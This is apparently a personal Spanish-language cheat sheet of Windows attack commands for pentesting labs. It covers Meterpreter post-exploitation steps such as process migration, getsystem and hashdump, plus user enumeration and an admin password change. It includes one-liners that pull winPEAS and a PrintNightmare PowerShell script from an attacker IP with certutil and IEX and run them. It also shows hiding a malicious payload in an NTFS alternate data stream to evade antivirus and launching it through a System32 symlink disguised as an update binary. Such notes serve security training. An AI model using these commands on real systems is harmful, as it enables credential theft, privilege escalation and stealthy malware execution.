# Comandos Windows

Tags: #Windows #Comandos 

## Comandos con Meterpreter

```bash 
# Cuando tienes la sesion con Meterpreter 

❯ ctrl + z                   # Colocas la sesion en 'Background'
❯ sessions                   # Miramos las sesiones activas 
❯ sessions -u <ID>           # Regresamos a la sesion 

❯ sysinfo                  # Muestra informacion del Windows 
❯ pgrep explorer           # Mirar el numero del proceso y asi poder escalar privilegios 
❯ pgrep lsass              # Mirar el numero del proceso y asi poder escalar privilegios 
❯ migrate <ID>             # Nos migramos al proceso 
 
❯ getuid                   # Miramos el nombre del usuario 
❯ getprivs                 # Miramos los privilegios 
❯ getsystem                # Miras los procesos privilegiados 

❯ getprivs                 # Miramos los  procesos con privilegios

❯ hashdump                 # Te muestra todos los hashes de los usuarios 
```


## Comandos con Shell

```bash
❯ net user                                   # Miramos todos los usuarios existentes y sus grupos
❯ net user <User>                            # Miramos el grupo de un usuario especifico
❯ net localgroup administrators              # Miramos los miembros del grupo administrador
❯ net user admin password123                 # Para cambiar la passwd al usuario admin siendo NT Authority 
```
```bash
❯ .\file.exe               # Ejecutamos un arcxhivo .exe en Windows 
```

```bash 
❯ cd DOCUME~1              # Para ir a un dir que tenga espacios en su nombre 'Documents and settings', debemos de colocar las 6 primeras letras 
```

```bash 
❯ systeminfo                                 # Nos muestra la informacion de Windows
❯ sysinfo                                    # Nos muestra algunos detalles de Windows
```

```bash
❯ cls                                        # Nos ayuda a limpiar la pantalla
```

```bash
❯ ipconfig                                   # Nos muestra las interfaces y las direcciones IP
```

```bash
❯ whoami                                     # Miramos el nombre del usuario
```

```bash
❯ dir                                        # Listamos el contenido del directorio
❯ dir /r /s ❮File.txt❯                       # Buscamos de forma recursiva el string .txt
```

```bash
❯ type ❮File❯                                # Nos muestra el contenido del archivo
```

```bash
❯ upload /home/omar/Documet/HTB/nc.exe       # Subimos el archivo Netcat a la maquina victima, colocando la ruta absoluta de la maquina de atacante en donde se encuentra
❯ upload /home/omar/Downloads/Firefox/winpeasx64.exe # Subimos el archivo WinPEAS a la maquina victima, colocando la ruta absoluta de la maquina de atacante en donde se encuentra
❯ certutil.exe -f -urlcache -split http://<IP>/winPeas.exe winPeas.exe           # Subimos el archivo WinPEAS a la maquina victima con la IP de atacante
❯ IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/CVE-2021-1675.ps1’)  # Con este comando en la maquina victima podemos subir el script en powershell que esta cargado en nuestro servidor, colocando la IP de atacante y el script .ps1
```

```bash
❯ copy \❮IP❯\\smbFolder\\❮File.exe❯ ❮File.exe❯    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante

	# IP = IP de atacante
	# smbFolder = Nombre del folder del recurso compartido
	# File.exe = Nombre del archivo .exe a copiar de la maquina de atacante
	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado
```

## Ocultar data en un archivo txt

Esta forma de ocultar un .exe dentro de un archivo txt nos ayuda a evadir detecciones básicas, antivirus.

```bash 
❯ type payload.exe > windowslog.txt:winpeas.exe    # El archivo payload que contiene el programa malicioso se convertira en un archivo txt llamado windowslog visible y detras sera oculta su data renombrado como winpeas.exe
❯ notepad windowslog.txt                           # Abrimos el archivo y es un archivo txt vacio, en el cual le podemos introducir cualquier data 
❯ start windowslog.txt:winpeas.exe                 # Ejecutamos el winpeas que esta oculto en el archivo de texto 

# Si no lo ejecuta, debemos de crear un enlace simbolico como NT Authority 
❯ cd windows\System32
❯ mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe       # Crear el enlace simbolico  

❯ wupdate                                                     # Ejecutar el programa                                               
```